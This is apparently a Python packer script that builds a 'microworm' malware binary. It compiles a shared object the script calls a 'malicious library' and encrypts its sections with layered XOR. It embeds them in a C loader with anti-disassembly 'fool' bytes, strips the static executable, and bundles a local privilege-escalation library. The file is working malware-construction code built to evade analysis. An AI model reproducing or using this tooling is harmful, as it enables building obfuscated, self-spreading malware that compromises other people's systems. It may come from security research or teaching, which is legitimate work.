#!/usr/bin/env python3

import sys, os
import subprocess
import regex as re
from random import randint



####################
## HELPER CLASSES ##
####################

###
# class to convert all information of a malware library into valid c-code that can be injected into the main.c-file
class MaLibrary:
    def __init__(self, name, got_mappings, data, data_length, entry_address, key):
        self.name = name
        self.got_offsets = "{" + ", ".join([key for key in got_mappings]) + "}"
        self.got_targets = "{" + ", ".join([got_mappings[key] for key in got_mappings]) + "}"
        self.got_mappings_count = len(got_mappings)
        self.data = data
        self.data_length = data_length
        self.entry_offset = entry_address
        self.key = int.from_bytes(bytes.fromhex(hex(key)[2:].ljust(16,'0'))[::-1]) # store key in reverse order, as bytes will be stored differently in memory
        self.elf_offset_data = "0x0"
        self.elf_offset_key = "0x0"
        self.fools_offsets = []

    def setup_string(self):
        fools = "{" + ", ".join([offset for offset in self.fools_offsets]) + "}"
        return f"""
            FOOLS;
            *libp = malloc(sizeof(MaLib));
            MaLib *lib = *libp;
            char {self.name}_data[] = "{self.data}";
            uint64_t {self.name}_data_length = {self.data_length};
            uint64_t {self.name}_entry_offset = {self.entry_offset};
            uint64_t {self.name}_got_offsets[] = {self.got_offsets};
            uint64_t {self.name}_got_targets[] = {self.got_targets};
            size_t {self.name}_n_got_mappings = {self.got_mappings_count};
            FOOLS;
            uint64_t {self.name}_key = {hex(self.key)};
            uint64_t {self.name}_fools_offsets[] = {fools};
            lib->got_offsets = {self.name}_got_offsets;
            lib->got_targets = {self.name}_got_targets;
            lib->n_got_mappings = {self.name}_n_got_mappings;
            FOOLS;
            lib->data = {self.name}_data;
            lib->data_length = {self.name}_data_length;
            lib->entry_offset = {self.name}_entry_offset;
            FOOLS;
            lib->key = {self.name}_key;
            lib->elf_offset_data = {self.elf_offset_data};
            lib->elf_offset_key = {self.elf_offset_key};
            lib->n_fools_offsets = {len(self.fools_offsets)};
            lib->fools_offsets = {self.name}_fools_offsets;
        """

###
# class that holds information about an ELF section
class ElfSection:
    def __init__(self, name, size, address):
        self.name = name
        self.size = size
        self.address = address

    def set_bytes(self, bs):
        self.bytes = bs


######################
## HELPER FUNCTIONS ##
######################

###
# execute a bash command (print the output if verbose=True)
def bash(command, verbose=False, working_dir=None):
    process = subprocess.Popen(command.split(), stdout=subprocess.PIPE, cwd=cwd if working_dir is None else working_dir)
    output, error = process.communicate()
    if verbose:
        print(output.decode())
    return output.decode()

###
# get the relative offset of all the functions in the objdump
def get_function_offsets(objdump):
    mappings = {}
    findings = re.findall(r"(?<!.+)(\w+) <([._@\w]+)>", objdump)
    for finding in findings:
        mappings[finding[1]] = hex(int(finding[0], 16))
    return mappings

###
# get the addresses of the ELF sections in the binary
def get_sections(file):
    dump = bash(f"objdump -h {file}")
    sections = []
    for line in dump.split("\n"):
        parts = re.split(r'\s+', line.strip())
        try:
            # check if first part is the index of the section
            int(parts[0])
            # get the section information from the current line
            section = ElfSection(name=parts[1], size=int(parts[2], 16), address=int(parts[3], 16))

            # extract the bytes of the section
            bs_tmp = f"{cwd}/bs_tmp.bin"
            bash(f"objcopy -O binary -j {section.name} {file} {bs_tmp}")
            tmpfile = open(bs_tmp, "rb")
            section.set_bytes(tmpfile.read())
            sections.append(section)
            tmpfile.close()
            os.remove(bs_tmp)
        except:
            continue
    return sections

###
# get the shared library as bytes
def get_bytes_so(sections):
    bs = b""
    pos = 0x0
    for section in sections:
        # add a padding between the sections in case there is space in between
        padding = section.address - pos

        # fill the padding with random bytes
        for i in range(padding):
            bs += int.to_bytes(randint(0x01, 0xff))

        # add the content of the section
        bs += section.bytes
        pos = section.address + section.size

    # convert to string to bytes representation, keeping the \\x
    return "".join(["0x{:02x}".format(c) for c in bs])

###
# get the got entries and map the actual offset of each function
def get_got_mappings(file, objdump):
    readelf = bash(f"readelf -r {file}")
    func_offsets = get_function_offsets(objdump)
    mappings = {}
    for line in readelf.split("\n"):
        parts = re.split(r'\s+', line.strip())
        try:
            # check if first part is the offset of the entry
            gotentry_offset = hex(int(parts[0], 16))
            name = parts[4]
            mappings[gotentry_offset] = func_offsets[name]
        except:
            continue
    return mappings

###
# get the address of the entry function in the malibrary.so (from a given objdump)
def get_entry(objdump):
    offset = get_offset(objdump, "entry")
    if offset != None:
        return hex(offset)
    return ""

###
# get the offset of a function in the binary
def get_offset(objdump, name):
    findings = re.findall(fr"\w+(?= <{name}>)", objdump)
    print(findings)
    if len(findings) > 0:
        return int(findings[0], 16)
    return None

###
# generate the code to insert into the main.c in order to setup the encrypted malware libraries
def get_module_setup_code(code, lib: MaLibrary):
    return code.replace("<lib_setup>", lib.setup_string())

###
# xor encrypt the data with layered xor-encryption logic (len(key) layers; for each layer, shift encryption start position by i positions and skip i bytes of data between each encryption)
def xor_encrypt_layered(bs, key=0x00):
    bs = bytearray.fromhex(bs.replace("0x",""))
    key = bytes.fromhex(hex(key)[2:].ljust(16, '0'))
    for i in range(len(key)):
        ik = 0
        for ib in range(i, len(bs), i + 1):
            bs[ib] ^= key[ik]
            ik = (ik + i + 1 ) % len(key)
    return "".join(["\\x{:02x}".format(b) for b in bs])


###
# generate a random 8byte key (uint64)
def generate_key():
    return int("0x"+"".join(["{:02x}".format(randint(0x01, 0xff)) for i in range(8)]), base=16)

###
# get data offset
def get_libdata_offset(file, libdata):
    with open(file, "rb") as f:
        data = f.read()
        index = data.find(libdata)
        if index is not None and index >= 0:
            return index
    return None

###
# get offsets of all the FOOL_LS bytes
def get_fools_offsets(file):
    sequence = b"\xeb\x08" + b"\x90"*8
    offsets = []
    last_idx = 0x0
    with open(file, "rb") as f:
        data = f.read()
        while True:
            index = data.find(sequence, last_idx)
            if index is None or index < 0:
                break
            offsets.append(hex(index+2))
            last_idx = index + 10
    return offsets


def compile_worm_with_all_offsets(code_original, lib, outbinary, out, data, strip=False):

    # extract the actual offset of the key in the compiled binary
    dump = bash(f"objdump -d -M intel {outbinary}")
    for line in dump.split("\n"):
        if hex(lib.key) in line:
            # check for the address of the key and rebuild the program
            lib.elf_offset_key  = hex(int(line.strip().split(':')[0][2:], 16) + 2)
            break

    # extract the actual offset of the data/code in the compiled binary
    lib_offset = get_libdata_offset(outbinary, bytes.fromhex(data.replace("\\x", "")))
    if lib_offset is None:
        raise LookupError("Data not found!")
    lib.elf_offset_data = hex(lib_offset)

    # get the offsets for the fooling LS bytes
    lib.fools_offsets = get_fools_offsets(outbinary)

    # prepare the code for compilation; insert the data for the MaLibraries
    code = get_module_setup_code(code_original, lib)

    # write the code to a file
    outfile = open(out, "w")
    outfile.write(code)
    outfile.close()

    flag = "-g"
    if strip:
        flag = "-s"
    # compile the final program as a static executable, containing all the necessary code and data
    bash(f"{gcc} {flag} -static -o {outbinary} {out}")   # -s to strip all the debug-symbols



def embed_library():
    bash("make", working_dir="./lpe")
    with (open("./lpe/bin/libnss_X/X1234.so.2","rb") as lib,
          open("./src/main/modules/library_bin.h","w") as src):
        bytes_read = lib.read()
        hex_arr = [hex(i) for i in bytes_read]
        str_arr = ",".join(hex_arr)
        src.write(f"""#pragma once\n\n""")
        src.write(f"""static char LIBRARY_BIN[] ={"{"} {str_arr} {"}"};""")

############
## CONFIG ##
############

# define the working directory
cwd = os.path.dirname(os.path.realpath(__file__))

# define the compiler
gcc = "gcc"

# prepare the working/output-directory
dir_bin = f"{cwd}/bin"
dir_src = f"{cwd}/src"

# define the libraries that should be embedded
module = "microworm"



#################
## PACKER CODE ##
#################

###
# pack the malicious library
def pack(module):
    # read the code of loader.c (where the library needs to be injected)
    main = "loader.c"
    out = f"{dir_src}/microworm.c"
    outbinary = f"{dir_bin}/microworm"
    mainfile = open(f"{dir_src}/{main}", "r")
    code_original = mainfile.read()
    mainfile.close()

    # define all the filenames
    so_file = f"{dir_bin}/{module}.so"

    # compile the library as position-independent shared object
    bash("make", verbose=True)

    # produce an objdump of the shared object
    objdump = bash(f"objdump -d -M intel {so_file}")

    # extract the ELF-sections
    sections = get_sections(so_file)

    # get the .GOT mappings
    got_mappings = get_got_mappings(so_file, objdump)

    # get the address of the entry-function
    entry = get_entry(objdump)

    # get the bytes of the shared object and xor_encrypt them
    data = get_bytes_so(sections)
    key = generate_key()
    print(f"Key: {hex(key)}")
    data = xor_encrypt_layered(data, key)

    # store the malicious library in the list
    lib = MaLibrary(module, got_mappings, data, len(data)//4, entry, key)

    # prepare the code for compilation; insert the data for the MaLibraries
    code = get_module_setup_code(code_original, lib)

    # write the code to a file
    outfile = open(out, "w")
    outfile.write(code)
    outfile.close()

    # compile the final program as a static executable, containing all the necessary code and data
    bash(f"{gcc} -g -static -o {outbinary} {out}")   # keep -g here to be able to easily extract information using objdump. Will be re-compiled later

    compile_worm_with_all_offsets(code_original, lib, outbinary, out, data, strip=False)

    # since setting the offsets for the fools-array actually changes the offsets, the process needs to be repeated
    # redo the last compilation to get correct fools offsets
    compile_worm_with_all_offsets(code_original, lib, outbinary, out, data, strip=True)

    # print the file-info of the compiled binary
    bash(f"file {outbinary}", verbose=True)


    return out

if __name__ =="__main__":
    embed_library()
    packed_file = pack(module)

    # DONE :)
    print(f"\n\n**Done**\n\nFind the resulting code at {packed_file}. :)")
